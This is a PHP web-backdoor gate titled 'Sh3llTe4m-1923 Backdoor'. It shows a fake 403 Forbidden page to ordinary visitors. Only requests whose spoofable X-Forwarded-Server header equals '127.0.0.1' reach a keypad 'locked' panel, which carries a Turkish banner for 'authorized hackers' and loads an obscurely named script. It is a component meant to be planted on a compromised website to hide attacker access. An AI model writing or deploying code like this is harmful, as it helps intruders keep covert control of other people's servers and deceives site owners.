<?php

$headers = apache_request_headers();

if (isset($headers['X-Forwarded-Server']) && $headers['X-Forwarded-Server'] == '127.0.0.1') {
    
    http_response_code(200);
    ?>
<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>Sh3llTe4m-1923 Backdoor</title>
  <link href="https://fonts.googleapis.com/css?family=Orbitron:400,500,700,900" rel="stylesheet">
<link href="https://fonts.googleapis.com/css?family=Share+Tech+Mono" rel="stylesheet">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css">
<link rel='stylesheet' href='https://s3-us-west-2.amazonaws.com/s.cdpn.io/836/flickity.css'><link rel="stylesheet" href="./stylee.css">

</head>
<body>
<div class="loader"></div>
<div class="lock">
  <div class="screen">
    <div class="code">0000</div>
    <div class="status">LOCKED</div>
    <div class="scanlines"></div>
  </div>
  <div class="rows">
    <div class="row">
      <div class="cell">
        <div class="text">0</div>
      </div>
      <div class="cell">
        <div class="text">1</div>
      </div>
      <div class="cell">
        <div class="text">2</div>
      </div>
      <div class="cell">
        <div class="text">3</div>
      </div>
      <div class="cell">
        <div class="text">4</div>
      </div>
      <div class="cell">
        <div class="text">5</div>
      </div>
      <div class="cell">
        <div class="text">6</div>
      </div>
      <div class="cell">
        <div class="text">7</div>
      </div>
      <div class="cell">
        <div class="text">8</div>
      </div>
      <div class="cell">
        <div class="text">9</div>
      </div>
    </div>
    <div class="row">
      <div class="cell">
        <div class="text">0</div>
      </div>
      <div class="cell">
        <div class="text">1</div>
      </div>
      <div class="cell">
        <div class="text">2</div>
      </div>
      <div class="cell">
        <div class="text">3</div>
      </div>
      <div class="cell">
        <div class="text">4</div>
      </div>
      <div class="cell">
        <div class="text">5</div>
      </div>
      <div class="cell">
        <div class="text">6</div>
      </div>
      <div class="cell">
        <div class="text">7</div>
      </div>
      <div class="cell">
        <div class="text">8</div>
      </div>
      <div class="cell">
        <div class="text">9</div>
      </div>
    </div>
    <div class="row">
      <div class="cell">
        <div class="text">0</div>
      </div>
      <div class="cell">
        <div class="text">1</div>
      </div>
      <div class="cell">
        <div class="text">2</div>
      </div>
      <div class="cell">
        <div class="text">3</div>
      </div>
      <div class="cell">
        <div class="text">4</div>
      </div>
      <div class="cell">
        <div class="text">5</div>
      </div>
      <div class="cell">
        <div class="text">6</div>
      </div>
      <div class="cell">
        <div class="text">7</div>
      </div>
      <div class="cell">
        <div class="text">8</div>
      </div>
      <div class="cell">
        <div class="text">9</div>
      </div>
    </div>
    <div class="row">
      <div class="cell">
        <div class="text">0</div>
      </div>
      <div class="cell">
        <div class="text">1</div>
      </div>
      <div class="cell">
        <div class="text">2</div>
      </div>
      <div class="cell">
        <div class="text">3</div>
      </div>
      <div class="cell">
        <div class="text">4</div>
      </div>
      <div class="cell">
        <div class="text">5</div>
      </div>
      <div class="cell">
        <div class="text">6</div>
      </div>
      <div class="cell">
        <div class="text">7</div>
      </div>
      <div class="cell">
        <div class="text">8</div>
      </div>
      <div class="cell">
        <div class="text">9</div>
      </div>
    </div>
  </div>
</div>
<div class="info">
  <p><strong>Kapılar Kapalı</strong>: Sadece Yetkili <a>Hackerlar</a></p>
</div>
  <script src='https://cdnjs.cloudflare.com/ajax/libs/flickity/2.0.10/flickity.pkgd.js'></script>
<script src='https://cdnjs.cloudflare.com/ajax/libs/howler/2.0.7/howler.js'></script><script  src="./4ca82b2a861f70cd15d83085b000dbde.js"></script>

</body>
</html>


<?php

} else {
   
    http_response_code(403);
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>403 Forbidden</title>
    <style>
    body {
      margin: 0;
      font-family: Helvetica;
    }

    .section {
      width: 100vw;
      height: 100vh;
    }

    .text-ctn {
      margin: 18px;
    }

    .marquee {
      width: 360px;
      border-bottom: 3px solid #000000;
      background-color: #000000;
      white-space: nowrap;
    }

    .marquee-text {
      display: inline-block;
      width: 260px;
      font-size: 24px;
      font-weight: bold;
      color: #ff0000;
      animation: scroll 3s linear infinite;
    }

    .marquee-text:before {
      content: "ACCESS DENIED";
    }

    @keyframes scroll {
      100% {
        transform: translateX(-100%);
      }
    }

    #sec-1 {
      display: flex;
      align-items: center;
      justify-content: center;
      background-color: #ff0000;
    }

    #ctn {
      margin-top: 40px;
      width: 360px;
      height: 360px;
      font-size: 30px;
      font-weight: bold;
      text-align: center;
      overflow: hidden;
    }

    #forbidden {
      display: inline-block;
      padding: 5px 10px 5px 10px;
      border: 2px solid #000000;
      border-radius: 8px;
      font-size: 50px;
      animation: flash 1s linear infinite;
    }

    @keyframes flash {
      50% {
        opacity: 0;
      }
    }
    </style>
    </head>
    <body>
    <div id="sec-1" class="section">
      <div id="ctn">
        <div class="marquee">
          <div class="marquee-text"></div><div class="marquee-text"></div><div class="marquee-text"></div>
        </div>

        <div class="text-ctn">ERROR</div>

        <div id="forbidden">FORBIDDEN</div>

        <div class="text-ctn">HTTP<br>403</div>

        <div class="marquee">
          <div class="marquee-text"></div><div class="marquee-text"></div><div class="marquee-text"></div>
        </div>
      </div>
    </div>
    </body>
    </html>

    <?php
}
?>
